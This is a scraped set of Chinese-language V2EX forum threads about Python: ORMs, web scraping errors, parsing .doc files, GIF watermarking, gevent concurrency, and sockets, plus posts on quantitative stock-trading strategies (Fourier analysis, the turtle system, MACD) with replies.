class=\"markdown_body\"><p>问题补充。。其实意思是Sprockets和Turbolinks等，让Rails这样的服务器框架在前端有一战的资本，而且实际效果不错，不知道py有没有这样的东西？</p>\n</div></div>"], "reply": "16", "tittle": "推荐一个 ORM： Orator； 另外请教个 py 前端工程化问题", "comment": ["哈哈，我就记得 Contributors 中有我的名字，虽然没贡献什么", "看你的需求了，对公司而言，单兵作战不是特别必要。分工细化也是大势所趋。前后端分离目前看起来在我们的实践过程里还是可以接受的。\r", "而且我不认为 Turbolinks 会是能带来第二春的东西，没准是 ruby 后端开发的自嗨呢？别人有做过 django 和 flask 适配的项目，你可以看看。", "恩确实情况不一样。背景是因为我们团队偏后端而且应该更多是对内，所以尽量想一栈通到底 :)", "py 还想插足前端？。。。。觉得前端还不够乱么", "听过这期 Teahour 节目 ", " ，里面说 Rails 的人不觉得前后端分离是个好实践，感觉 Rails 在这方面投入的也不多。 TurboLinks 似乎也可以用在其他框架上？\r", "\r", "Python 的话，我觉得挺多做 Web API 的框架了（比如 DjangoRestFramework 、 Falcon 等等），似乎也不比 Rails 差哪去？", "TypeError: unsupported operand type(s) for -=: 'Retry' and 'int'", "一直是 sqlalchemy + alembic", "users = User.where('votes', '>', 100).take(10).get()\r", "\r", "\r", "这也能叫 orm ？？？", "已 star\r", "\r", "感谢分享", "已 star\r", "\r", "感谢 lz 分享", " 看到你的回复有种眼前一亮的感觉，你觉得 ORM 是什么 0.0", "我更希望有一款 groovy 的 orm ， gorm 用的 hibernate 也是头重脚轻。", "api 设计的和 Laravel 的 Eloquent 好像", " 就是 py 版 Eloquent", " 个人觉得平时用 groovy 的话，不如试试 JRuby （比 Jython 活跃多了）+Rails ？", " ruby 的写法反人类"]},
{"content": ["<div class=\"topic_content\">我在用 urllib.request 抓取网页时用了 try.....except Exception as e: ，让他出错就在屏幕显示出来，然后再继续下一个循环。\r<br>可是现在碰到一个问题，就是有些页面不能连接后会转到 404 页面，但是这时就不会触发 except ，导致 urllib.request 会取到 404 页面的代码，后边的程序再分析这个 404 页面，当然分析不出来结果。\r<br>像这样的情况应该如何解决？</div>"], "reply": "4", "tittle": "在设置了 404 页面的网页，如何才能让连接报错？", "comment": ["不怎么懂 python ，分析出不来结果就丢弃啊", "说明网站差， HTTP 协议的正确搞法不是「跳转到 404 页面」，而是返回「 404 代码和 404 页面」。碰到这种网站只好你自己手动检查跳转网址了", "查看一下响应头部的状态码是什么", "看一下 网页内容吗? 如果是 404 直接 raise 一个 exception 就行了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>方案一： python 解析 docx 格式支持良好但对 doc 格式支持很差，故希望 doc 转为 docx 格式，有什么好办法？\n方案二：将 doc 转为 html 格式，然后解析 html ，测试后发现如果数据量大了支持也不好\n大家有什么好办法吗？</p>\n<p>注：有近 1w 个*.doc 文档，每个文档 100Mz 左右</p>\n</div></div>"], "reply": "6", "tittle": "python 解析 word 的 doc 格式，有什么好办法?", "comment": ["是需要提取 doc 里的内容？\r", " 用这个可以将 doc 转成 html 或 docx 。", " 提取 word 中的表格", "py 通过 office 之类的软件打开 doc ，转换成 docx ，然后自由发挥。这样呢？", "之前转换了 2000 多个 doc 入 pdf 用的这种方式", "这种特殊需求还不如现学 VBA 三下五除二，别信 Python 的唯有唯一正确解的梦话。 Perler 说过黑猫白猫，都是好猫", "用 c#调用 office 接口操作 word 进行解析，应该很容易。"]},
{"content": ["<div class=\"topic_content\">人类对于股市波动规律的认知，是一个极具挑战性的世界级难题。迄今为止，尚没有任何一种理论和方法能够令人信服并且经得起时间检验—— 2000 年，著名经济学家罗伯特·席勒在《非理性繁荣》一书中指出：“我们应当牢记，股市定价并未形成一门完美的科学”； 2013 年，瑞典皇家科学院在授予罗伯特·席勒等人该年度诺贝尔经济学奖时指出：几乎没什么方法能准确预测未来几天或几周股市债市的走向，但也许可以通过研究对三年以上的价格进行预测。美国证券分析家拉尔夫·.纳尔逊·.艾略特（ IiR.N.Elliott ）根据这一发现他提出了一套相关的市场分析理论，精炼出市场的 13 种形态（ Patte·rn ）或波浪（ Waves ），在市场上这些型态重复出现，但是出现的时间间隔及幅度大小并不一定具有再现性。而后他又发现了这些呈结构性型态之图形可以连接起来形成同样型态的更大图形。这样提出了一系列权威性的演绎法则用来解释市场的行为，并特别强调波动原理的预测价值，这就是久负盛名的艾略特波浪理论。艾略特波浪理论（ Elliott Wave Theory ）是股票技术分析的一种理论。认为市场走势不断重复一种模式，每一周期由 5 个上升浪和 3 个下跌浪组成。艾略特波浪理论将不同规模的趋势分成九大类，最长的超大循环波(grand supercycle) 是横跨 200 年的超大型周期，而次微波(subminuette)则只覆盖数小时之内的走势。但无论趋势的规模如何，每一周期由 8 个波浪构成这一点是不变的。\r<br>任何函数都可以在频域空间上进行展开，用以分析其周期特性。对此，我们不妨先做个大胆的假设，假设大盘具有某些不为人知的周期性质（波浪理论）。如果，我们能够弄清大盘的周期特性，那将会使得我们对大盘的起伏具有更深刻的认识。\r<br>f(t)是 t 的周期函数，如果 t 满足狄里赫莱条件：在一个以 2T 为周期内 f(X)连续或只有有限个第一类间断点，附 f （ x ）单调或可划分成有限个单调区间，则 F （ x ）以 2T 为周期的傅里叶级数收敛，和函数 S （ x ）也是以 2T 为周期的周期函数，且在这些间断点上，函数是有限值；在一个周期内具有有限个极值点；绝对可积。则有下图①式成立。称为积分运算 f(t)的傅立叶变换，\r<br>②式的积分运算叫做 F(ω)的傅立叶逆变换。 F(ω)叫做 f(t)的像函数， f(t)叫做\r<br>F(ω)的像原函数。 F(ω)是 f(t)的像。 f(t)是 F(ω)原像。\r<br>公式： <a target=\"_blank\" href=\"https://uqer.io/community/share/57e8aaa6228e5b47ec0d8ee1\" rel=\"nofollow\">https://uqer.io/community/share/57e8aaa6228e5b47ec0d8ee1</a>\r<br><a target=\"_blank\" href=\"/i/0FDkMHzsl.png\" title=\"在新窗口打开图片 0FDkMHzsl.png\"><img src=\"//i.v2ex.co/0FDkMHzsl.png\" class=\"embedded_image\"></a>\r<br>现在，我们取出每天的涨跌幅，重新得到涨跌幅随时间的变化（ 365 天）\r<br>\r<br><a target=\"_blank\" href=\"/i/X6CMpVpol.png\" title=\"在新窗口打开图片 X6CMpVpol.png\"><img src=\"//i.v2ex.co/X6CMpVpol.png\" class=\"embedded_image\"></a>\r<br>由于考虑到越近的股价波动对今后的股价影响越大，故对其权重按照指数衰减的方式重新调整。\r<br>\r<br><a target=\"_blank\" href=\"/i/u9a499vll.png\" title=\"在新窗口打开图片 u9a499vll.png\"><img src=\"//i.v2ex.co/u9a499vll.png\" class=\"embedded_image\"></a>\r<br>然后，我们便可以对其做傅立叶变换（ FFT ），得到这组震荡函数在频域上的分布：\r<br>\r<br><a target=\"_blank\" href=\"/i/c5N09BNUl.png\" title=\"在新窗口打开图片 c5N09BNUl.png\"><img src=\"//i.v2ex.co/c5N09BNUl.png\" class=\"embedded_image\"></a>\r<br>由于，在频域上出现高频和低频信号的幅度几乎都是差不多，而且没有明显的峰值。但是在某些特定日期的周期上存在相对强的振幅。为了能够预测一两周的大致走势，所以，我们去掉了低频（ 1 天的震荡）和高频的分量（一年的震荡）。然后采用傅立叶逆变换来还原之前的函数。所以原函数和还原后的函数有略微的差异。\r<br>\r<br><a target=\"_blank\" href=\"/i/Y8dKA7Gel.png\" title=\"在新窗口打开图片 Y8dKA7Gel.png\"><img src=\"//i.v2ex.co/Y8dKA7Gel.png\" class=\"embedded_image\"></a>\r<br>最后，我们利用还原后的函数得到未来大致的涨跌幅（红色曲线超出蓝色曲线的部分）。\r<br>利用涨跌幅再进一步还原往后的股价走势\r<br>图片： <a target=\"_blank\" href=\"https://uqer.io/community/share/57e8aaa6228e5b47ec0d8ee1\" rel=\"nofollow\">https://uqer.io/community/share/57e8aaa6228e5b47ec0d8ee1</a>\r<br>可以看到，通过频域信号的处理，我们滤过了高频和低频的信号，而只重视以大概一周为周期的股价波动的周期信号来还原股价的波动性。包含了股价处于不同波段的位置（波峰或波谷），从而预测股票的价格。\r<br>从结果上看，为了几天内可能还会出现振荡走低的结构，但随和会出现一波反弹。\r<br>以上结构都是利用 matlab 分析而得出，不构成任何投资建议，只是提供一种思路供大家交流学习。</div>"], "reply": "4", "tittle": "大盘的频域分析--高低频信号处理（利用 matlab 分析而得出，不构成任何投资建议）", "comment": ["。。。。\r", "今天忍不住要多说几句\r", "难道你不知道 implied 波动\r", "现在有 ivix 和 cvx 。    \r", "lol", "这类数据分析浩如烟海，不客气地说，楼主这个一分钱价值都没有。", "半夜放个政策，第二天开盘涨停或者跌停，能分析出来么。\r", "\r", "还不如内部消息", "最后一句话白加了，大家并不相信你。哈哈"]},
{"content": ["<div class=\"topic_content\">如题。。。如何给 gif 图片加水印， pillow 试了一下，发现加了之后图片不会动了。也可能是我的方法不对。谢谢大神。</div>"], "reply": "15", "tittle": "如何给 gif 图片加水印?", "comment": ["Photoshop 目前对多个 GIF 的组合处理是最棒的。", "没看到是 Python 节点", " 是我没描述清楚。。。", "给每一帧都加上水印，然后再合并成 gif 的；这里有 php 版本的， python 的可以照着这个写 ", "同写过 php 的。\r", "把动画逐帧拆开，比如 100 帧的 gif 动画，拆开就是 100 个 gif 文件。然后批量加水印，最后拼回 gif 。\r", "\r", "拆 和 拼 这个操作，没有内置函数。用的第三方的 gifdecoder.class.php 和 gifencoder.class.php 。", "工具： ImageMagick\r", "Google ： imagemagick add watermark to animated gif", "好繁琐  干嘛要加水印", "ffmpeg", "你不会是 UC 的吧！", " 有毛边怎么办？有的 gif 添加水印后右边有一竖条不停闪烁。", " 应该是版本问题，新版本已经修复了这个问题，但是我用的 Ubuntu 版本太低，不提供最新版本。再次表示感谢。", "python imageio\r", "seek save 成每一帧  加水印后 mimsave 成 gif", " ffmpeg 输出质量不高怎么办？", " 谢谢，非常感谢", " 赞一个"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>山东联通打不开。 pip 也挂了。\n站长工具的 ping 目前也都是红的超时。</p>\n</div></div>"], "reply": "4", "tittle": " 是不是挂了", "comment": ["湖北电信表示没有", " 刚发完帖子，我这边访问也没问题了……", "虽然打开的巨慢，但还是打开。", " "]},
{"content": ["<div class=\"topic_content\">前言\r<br>\r<br>海龟交易系统本质上是一个趋势跟随的系统,但是最值得我们学习的,是资金管理尤其是分批建仓及动态止损的部分\r<br>\r<br>一、趋势捕捉\r<br>\r<br>唐奇安通道\r<br>\r<br>该指标是有 Richard Donchian 发明的，是有 3 条不同颜色的曲线组成的，该指标用周期（一般都是 20 ）内的最高价和最低价来显示市场价格的波动性，当其通道窄时表示市场波动较小，反之通道宽则表示市场波动比较大。 如图所示：\r<br>    该具体分析为：\r<br>    当价格冲冲破上轨是就是可能的买的信号；反之，冲破下轨时就是可能的卖的信号。\r<br>    该指标的计算方法为：\r<br>\r<br>    上线=Max （最高低， n ）\r<br>    下线=Min （最低价， n ）\r<br>    中线=（上线+下线）/2 \r<br>\r<br><a target=\"_blank\" href=\"/i/o8vC2m92l.png\" title=\"在新窗口打开图片 o8vC2m92l.png\"><img src=\"//i.v2ex.co/o8vC2m92l.png\" class=\"embedded_image\"></a>\r<br>海龟交易就是利用唐奇安通道的价格突破来捕捉趋势。\r<br>不过我们在向下突破 10 日唐奇安下沿卖出。\r<br>二、资金管理\r<br>\r<br>2.1 、 N 值计算\r<br>\r<br>N 值是仓位管理的核心，涉及加仓及止损。另外， N 值与技术指标平均真实波幅 ATR 很相似\r<br>首先介绍真实波幅： 真实波幅是以下三个值中的最大值\r<br>    1 、当前交易日最高价和最低价的波幅\r<br>    2 、前一交易日的收盘价与当前交易日最高价的波幅\r<br>    3 、前一交易日的收盘价与当前交易日最低价的波幅 \r<br>用公式写就是：\r<br>TrueRange=Max(High−Low,High−PreClose,PreClose−Low)\r<br>接下来， N 值计算公式为：\r<br>N=PreN[−19 ：]+TrueRange20\r<br>    其中 preN 为前面 N 值， TrueRange 为当前的真实波幅,此公式的真是含义为计算之前 20 天（包括今天在内）的 N 的平均值 \r<br>另外，有些海龟交易系统用的是 ATR 来代替 N 值， ATR 为真实波幅的 20 日平均。\r<br>\r<br>2.2 买卖单位及首次建仓\r<br>\r<br>先给出公式：\r<br>Unit=1%∗AccountN\r<br>首次建仓的时候，当捕捉到趋势，即价格突破唐奇安上轨时，买入 1 个 unit 。\r<br>其意义就是，让一个 N 值的波动与你总资金 1%的波动对应，如果买入 1unit 单位的资产，当天震幅使得总资产的变化不超过 1%。例如：\r<br>        现在你有 10 万元资金， 1%波动就是 1000 元。假如标 X 的 N 值为 0.2 元， 1000 元÷0.2 元=5000 股。也就是说，你的第一笔仓位应该是在其突破上轨（假设为 5 元）时立刻买入 5000 股，耗资 25000 元。 \r<br>2.3 加仓\r<br>\r<br>若股价在上一次买入（或加仓）的基础上上涨了 0.5N ，则加仓一个 Unit 。\r<br>    接上面的例子：假如 N 值仍为 0.2 。\r<br>    价格来到 5 + 0.2*0.5 = 5.1 时，加仓 1 个 Unit ，买入 5000 股，耗资 25500 元，剩余资金 49500 元\r<br>    价格来到 5.1 + 0.2*0.5 = 5.2 时再加仓 1 个 unit 。买入 5000 股，耗资 26000 元，剩余资金 23500 元 \r<br>2.4 动态止损\r<br>\r<br>当价格比最后一次买入价格下跌 2N 时，则卖出全部头寸止损。\r<br>        接上面的例子，最后一次加仓价格为 5.2 。假如此时 N 值 0.2 元。 当价格下跌到 5.2 - 2*0.2 = 4.8 元时，清仓。\r<br>        持仓成本为 （ 5+5.1+5.2 ）*5000/15000 = 5.1 元。 此时亏损 （ 5.1-4.8 ）*15000 = 4500 元 对于 10 万来说 这波亏损 4.5% \r<br>2.5 止盈\r<br>\r<br>当股价跌破 10 日唐奇安通道下沿，清空头寸结束本次交易\r<br>三、代码实现\r<br>\r<br>本代码用 ATR 代替 N 值进行计算,其他逻辑不变:\r<br>ATR=MA(TrueRange,20)\r<br>我们以单只股票为标，建立海龟交易系统，当然，可以将总资产均分为 n 份，同时交易 n 个标。\r<br>\r<br>计算 ATR 值用日线数据，监控价格突破采用分钟线 \r<br>0 初始化参数，在 initialize(account)写入\r<br>def initialize(account): \r<br>    account.last_buy_prcie = 0  #上一次买入价\r<br>    account.hold_flag = False   # 是否持有头寸标志\r<br>    account.limit_unit = 4     # 限制最多买入的单元数\r<br>    account.unit = 0       # 现在买入 1 单元的股数\r<br>    1 唐奇安通道计算及判断入场离场：\r<br>高清源代码请查看： <a target=\"_blank\" href=\"https://uqer.io/community/share/57bd5864228e5b79a575a9b2\" rel=\"nofollow\">https://uqer.io/community/share/57bd5864228e5b79a575a9b2</a>\r<br>构建策略\r<br>\r<br>分钟线回测时间略长啊~\r<br>先把上面写的函数集中下，方便微核充启后运行函数\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/4G7QD9K0l.png\" title=\"在新窗口打开图片 4G7QD9K0l.png\"><img src=\"//i.v2ex.co/4G7QD9K0l.png\" class=\"embedded_image\"></a>\r<br>我们发现，收益基本上处于阶梯状上升。但是几年下来收益也并不高，我们来看看记录下来的数据，分析下整个过程：\r<br>高清源代码请查看： <a target=\"_blank\" href=\"https://uqer.io/community/share/57bd5864228e5b79a575a9b2\" rel=\"nofollow\">https://uqer.io/community/share/57bd5864228e5b79a575a9b2</a>\r<br>把图画出来：\r<br>    红色点为入场点；\r<br>    蓝色点为离场点；\r<br>    绿色点位止损点 \r<br>\r<br><a target=\"_blank\" href=\"/i/hnL8widwl.png\" title=\"在新窗口打开图片 hnL8widwl.png\"><img src=\"//i.v2ex.co/hnL8widwl.png\" class=\"embedded_image\"></a>\r<br>可以发现：\r<br>ATR 波形有些异常，有些地方会直线上升。分析后发现：因为 quartz 中， account.get_daily_history()取得的最高最低价中，对停牌的情况处理为了 0 ！\r<br>\r<br>我们调整下策略：\r<br>    在计算 ATR 时，剔除最高最低为 0 的部分，再做平均。 \r<br>数据走势图链接： <a target=\"_blank\" href=\"https://uqer.io/community/share/57bd5864228e5b79a575a9b2\" rel=\"nofollow\">https://uqer.io/community/share/57bd5864228e5b79a575a9b2</a>\r<br>累计收益相差不多，我们再来看看记录的数据。\r<br>    红色点为入场点；\r<br>    蓝色点为离场点；\r<br>    绿色点位止损点 \r<br>\r<br>数据走势图链接： <a target=\"_blank\" href=\"https://uqer.io/community/share/57bd5864228e5b79a575a9b2\" rel=\"nofollow\">https://uqer.io/community/share/57bd5864228e5b79a575a9b2</a>\r<br>这次发现， ATR 波形比较正常，在波动剧烈的时候增大。\r<br>\r<br>观察入场、离场、止损点发现，海龟交易系统捕捉到了大的上涨趋势，在震荡市中不断试错止损。\r<br>\r<br>上涨过程中出现回调容易震出，减少了回撤的同时也减小了收益。\r<br>\r<br>再看看仓位情况\r<br>\r<br><a target=\"_blank\" href=\"/i/NlQqc8H5l.png\" title=\"在新窗口打开图片 NlQqc8H5l.png\"><img src=\"//i.v2ex.co/NlQqc8H5l.png\" class=\"embedded_image\"></a>\r<br>可以发现，大部分持有情况下仓位在 0.5 左右，甚至低于半仓，少数高于半仓的情况最高不超过 0.8 。因此，收益不高也是正常了。\r<br>\r<br>总结\r<br>\r<br>本文主要介绍了海龟交易的细节，不过是面向一个投资目标的。当想投多只股票时，可以先设定几个坑位，平分资金，然后对每个坑位采用海龟交易策略。\r<br>\r<br>海龟交易系统通常会用两个趋势捕捉系统，不同之处在于价格突破的上下线计算。系统 1 ：突破上线 20 日最高买，突破下线 10 日最低卖；系统 2 ：突破上线 55 日最高买，突破下线 20 日最低卖。 这部分可以通过修改参数实现。\r<br>\r<br>原始的海龟交易采用唐奇安通道来捕捉趋势，虽然能捕捉到大趋势，但是在震荡的情况下表现不如人意，不过这也是所有趋势型策略的通病。\r<br>\r<br>海龟交易策略的核心在于资金管理，可以看出策略的回撤比较小，并且还有优化的空间。资金管理不一定要与趋势型策略结合，是不是可以用到多因子策略上？动量反转？均值回归？这些就留给读者们自行尝试了~</div>"], "reply": "20", "tittle": "借助 Python 实现海龟交易系统：）", "comment": ["分析的不错。这么多，是自己写的吗？\r", "\r", "想了解下，金融 python 的收入如何，能达到一个什么水平，如果只是码代码的话", "马克", "大智慧公式就能编辑这个...", "这是转帖么？", "十年前用飞狐写指标", "嘿嘿，不用看，按照这个系统肯定亏钱，原因很简单，按照技术 k 线执行买卖，是一种滞后行为，确定时间周期下，比如日 k 线下，除了大幅波动可以赚到一部分钱（去掉初期上涨段和下跌开始段），其他小幅波动段都是亏钱的，总体上亏的多，赚的少\r", "按照技术 k 线你只有找到一个方法，就是能从大周期上预期出向上或向下的概率，你才能赚钱\r", "当然，还有就是作弊，就是在期货盘口不断挂单撤单，制造假象", "能从大周期上预期出向上或向下的概率，有人研发出来，可是人家不会告诉你的", " 发出来估计也就不准了。。。多出来的买卖会冲垮那个模型", "最近在研究，做成客户端。也是趋势交易", " 这叫程序化交易，有些模型是可以做到大概率赚钱的，例如网格交易和 MACD 。", "外汇交易 更适合程序化交易， MT4 的 EA 就是用 mql5 编写", "记录这的交易过程.jpg", "意思是自动买入抛出？", " 可以这么说", "用 mt4 写很方便，不过我写的。。从来没盈利过。。 = =", "又见量化平台推广贴", "量化永远是这样的。高频交易才是你们应该尝试的。", "dataeye 广告贴。。惨无人道", "不适合做 T+1 的股票。", "A 股 T+1  你得等到明天"]},
{"content": "", "reply": "7", "tittle": "Python 时间格式化问题，抓取网页时候会遇到各种各样的时间格式(需要格式化成： yyyy-mm-dd hh:mm:ss)，现在遇到一种格式就需要往里面添加正则。是否有好的解决办法？！", "comment": ["你可以写一个通用时间轮子，然后坐等伸手党调用\r", "→_→", "（用 js 来转， new Date().getTime 解决)", "\r", "\r", "很好用，无脑解析", "PHP 大法好 strtotime() 支持各种时间格式", " 哈哈 :)", "arrow", "三楼 python-dateutil 轮子还支持多语言(包括中文)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一直在用 multiprocessing 和 threading ，遇到内存、资源消耗等问题，想要用<code>gevent.spawn()</code>改写。</p>\n<p>我的主进程是一个 rpc 服务器（不能被阻塞），我只想要异步执行一段代码，不想要结果（代码片段会调用 client 通知结果给主进程）， 如果用join 会阻塞。</p>\n<p>看了一篇文章 <a href=\"http://www.jianshu.com/p/571db0eb95f8\" rel=\"nofollow\">http://www.jianshu.com/p/571db0eb95f8</a>\n作者说道：</p>\n<blockquote>\n<p>我在 Python shell 中 gevent.spawn 一个函数，它怎么不运行？ 按照自然的思维就是 spawn 后就应该要运行啊。 Erlang 就是这样的</p>\n<p>为什么 spawn 出的协程要 join ，一调用 join 就会把整个 python process 阻塞住。丝毫感觉不到异步啊。</p>\n<p>在学习两次失败后，后来终于想明白了:</p>\n<p>shell 中 spawn 不运行，是因为 gevent 的 event loop 没有跑起来，无法去调度 greenlet 。</p>\n<p>join 就是在启动 gevent 的 gevent loop ，<strong><em>一旦 gevent loop 通过其他方式启动起来了， 那么就可以在程序中自然的 spawn 进程。</em></strong>新 spawn 的 greenlet 会被调度执行。</p>\n<p>当跨过这个障碍后，学习和使用 Gevent 容易了很多。</p>\n</blockquote>\n<p>很想知道怎样启动 gevent loop ，可以让我新的 spawn 自动异步运行？\n尝试了以下代码</p>\n<pre><code>gevent.spawn(task)\ngevent.sleep(0)\n</code></pre>\n<p>可以跑通，但是 task 函数内如果有 gevent.sleep(2), grequest 之类的语句，就会出现跑一半不跑了的情况，觉得不靠谱会这样那样的意外，因为我没有办法干涉 task 函数。</p>\n<p>这让我感觉到 gevent 在 python 大型应用程序的使用率应该很低，要么全部都用，要么全部都不能用，大部分团队多半会选择后者。</p>\n<p>想的有点多了，不知道是不是这样呢</p>\n</div></div>"], "reply": "17", "tittle": "怎样异步执行 gevent.spawn()，避免主进程阻塞？", "comment": ["“是因为 gevent 的 event loop 没有跑起来，无法去调度 greenlet ” 你确定是这个原因？ spawn 一个函数，函数里内容是啥？", " 所以我必须要知道函数的内容才能用 gevent.spawn 吗？ FYI, 函数内容是调用 client 给 rpc 服务器发送请求并获取返回，这个请求可能瞬间也可能需要数秒，取决于服务器怎么处理。", "先找到程序中被阻塞部分, 改为非阻塞的.", " 问：怎么改？答：用 gevent.spawn 。\"又回到最初的起点，呆呆的站在镜子前，笨拙#~*&(@$!#$^@#%!~\"", " 你需要了解 Linux 编程里面的 IO 操作， gevent.spawn 只是一个封装，你大可用系统调用 ioctl 将 fd 设成非堵塞，那么所有的读都是非堵塞的了", "我不知道你的程序阻塞在哪了, 建议先看一下 gevent 的猴子补丁部分的内容(会让你对这个问题出现的原因有个大概的认知), 如果猴子补丁并不能解决你阻塞的问题, 建议还是换一个方案.当然, 阻塞变非阻塞不是 gevent.spawn 干的事.", "  一次 spawn 看不出啥的", "好几年没用了。不过我印象中 gevent 是协作式的并行，同一时刻只能有一个协程运行，必须由它主动让出自己的执行状态，换成别的协程。\r", "所以如果某一协程要做网络调用，那么应该在发起非阻塞请求，然后让出执行权，等待别人再把执行权交给回自己。\r", "一般都是通过 monkey patch ，把 python 的一些库函数包装成使用 gevent 的。但有些没包装的，就可能会阻塞了，要自己改。", "你是不是理解错了什么， gevent 并不能让你的程序「异步」运行，它只能帮你在 event wait 时切换协程罢了。\r", "例如你的 task 是计算型的，没有 event wait 或者主线程不将执行权限交还给 gevent （例如 gevent.sleep ），它怎么切换？怎么去执行其他的协程？", "所以，该用进程或者线程的时候就要用啊。", " 我觉得，还是先推荐读 UNP 比什么都重要，读后才开始“异步”编程，否则一个 sleep ，或者 gevent 里面写日志到本地文件，就全线爆炸了。\r", "太多新人根本不了解所谓的异步，同步，堵塞，非堵塞然后就开始上各种框架，这是一切的问题的根源啊。", "看了这么多回复，原来 gevent 并不能让我异步化，我还是继续用 threading 吧，谢谢大家！", " 我的程序阻塞在 task 函数里面。猴子补丁会让我的应用程序充满不确定性，除非我很清楚他究竟 monkeypatch 了哪些模块，否则我不会用的", " 嗯我想我在那个地方应该用的是线程，谢谢你对 gevent ，和切换协程的解释", " 不用 monkeypatch.patch_all()，你可以自己一个一个 patch ，具体 patch 了什么 ", "\r", "两大切记， gevent 在面对 CPU 密集型以及本地 IO 密集型的任务，都很无力", " \r", "我怀疑他的 patch_all 不在第一行。。。。", " 请先看懂我的问题谢谢！"]},
{"content": ["<div class=\"topic_content\">MACD 公式算法:\r<br>\r<br>短期 EMA ： 短期（例如 12 日）的收盘价指数移动平均值（ Exponential Moving Average ）\r<br>长期 EMA ： 长期（例如 26 日）的收盘价指数移动平均值（ Exponential Moving Average ）\r<br>DIF 线：　（ Difference ）短期 EMA 和长期 EMA 的离差值\r<br>DEA 线：　（ Difference Exponential Average ） DIF 线的 M 日指数平滑移动平均线\r<br>MACD 线：　 DIF 线与 DEA 线的差\r<br>策略实现： <a target=\"_blank\" href=\"https://uqer.io/community/share/560a3007f9f06c597665ef61\" rel=\"nofollow\">https://uqer.io/community/share/560a3007f9f06c597665ef61</a>\r<br>\r<br>DIF 从下而上穿过 DEA ，买进；\r<br>相反，如 DIF 从上往下穿过 DEA ，卖出。\r<br>策略中使用 talib 计算 MACD\r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/560a3007f9f06c597665ef61\" rel=\"nofollow\">https://uqer.io/community/share/560a3007f9f06c597665ef61</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/W1K4n8OSl.png\" title=\"在新窗口打开图片 W1K4n8OSl.png\"><img src=\"//i.v2ex.co/W1K4n8OSl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/W1K4n8OSl.png\" title=\"在新窗口打开图片 W1K4n8OSl.png\"><img src=\"//i.v2ex.co/W1K4n8OSl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/7u6x805ul.png\" title=\"在新窗口打开图片 7u6x805ul.png\"><img src=\"//i.v2ex.co/7u6x805ul.png\" class=\"embedded_image\"></a></div>"], "reply": "1", "tittle": "突然发现一个 simple MACD 算法", "comment": ["当年用飞狐写指标。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在整网络这块的东西，恰好弄到 socket 了，感觉理解的好笼统，一点那都不专业咋办？各位 V 友有没有对应文章推荐呢？</p>\n</div></div>"], "reply": "31", "tittle": "怎么理解 Python 中的 socket 工作原理？", "comment": ["你问的是 socket\r", "还是 python 里的 socket\r", "还是 python\r", "？", " python 里的 socket", "python 易用，但是不代表你不用学操作系统的东西，找本网络编程补补课吧。", " python 里的 socket 就是操作系统里的 socket 直接包了一层而已", " 那我是否可以理解他其实就在服务器上开了一扇门，然后客户端通过找到这扇门进行通讯，建立的连接是通过 tcp/udp 协力的，这其中是否牵扯到了 http 呢？", "直接看 ", "\r", "想更多？看 ", "\r", "想更多？ 看 ", "\r", "还想更多？ 看 ", "\r", "还想更多？至少我不想看了。", " V5", "拿 python 学 socket 的话强烈推荐使用 ipython ，甚至可以帮你把 tcp 的各个状态理解清楚", " 我只想知道他的流程。。。。", "Python 的 Socket 和 C 的 Socket 没啥区别，简单包了一层\r", "\r", "建议先学习一本书叫《 Unix 高级环境编程》中的 socket 通信部分章节，这本书是所有*NIX 环境下，不管你用什么语言，都必须先学习的一本书。。。", "楼主需要补充一下计算机网络相关的姿势", "python 中的 socket 只是用 python 实现的而已，跟其他语言的 socket 工作原理并没有什么不同", "这和 python 有什么关系 ，是你自己不理解 socket 。。。", "不知道你说的是 socket 还是网络编程，下面两篇网络编程的文章推荐给你看一下。\r", "\r", "用 Python 理解服务器模型(上) ", "\r", "用 Python 理解服务器模型(下) ", " socket", " socket 就简单了，看我发的文章里第一章就够了。", "你可以这样理解： Python 通过调用系统底层 叫 socket 的 api 实现 和 客户机 的 tcp/udp 通信", " thx", " socket 其实就是对 tcp/ip 、 tcp/udp 的一个封装，也就是 python 提供了一个的网络打交道的模块把。", "根据 5L 的回复，你先需要学习了解 BSD socket 原理， python 跟它是基本一样的，连 error no 都一样\r", "注意同一版的 python ，在 linux 和 windows 上 socket 封装是不同的，返回状态和 error no 是跟随系统，如上面所说只是打包", "可以看《 Python 网络编程》 这本书", " 不是 UNIX 网络编程？", "  ip 协议网络层的， tcp/udp 协议是传输层的 不是一个层级的东西。 如果你只是想大概明白 socket 基本就我说的意思哦~~", "  先会用，再去分析原理才是正路", " 会用了，只是想了解下原理方面，毕竟这个东西应用还是蛮多的。", "  那就参考 6 楼的链接吧，不论啥语言的 Socket 功能，都是对操作系统的 socket 接口做的封装", " 我觉得 14 楼的挺好的，", "  那只是网络服务模型，不是你提到的“ socket 工作原理”", " 技术不需要作比喻，技术就是技术。如果你需要比喻才能理解，那你其实还没理解", "两个关键字：三次握手， CLOSE_WAIT 。可以了解各大概了。\r", "\r", "这玩意儿很难一下子理解透彻，遇到问题对着状态图多看，自己写个 tcp echo client/server 多试。", "直接动手就大块头的书太过分了。。如果是要快速理解的话推荐看看 tutorialspoint 家的教程 ", " ，如果不做服务器端开发基本不会用到的， Web 框架里面都封装好了"]},
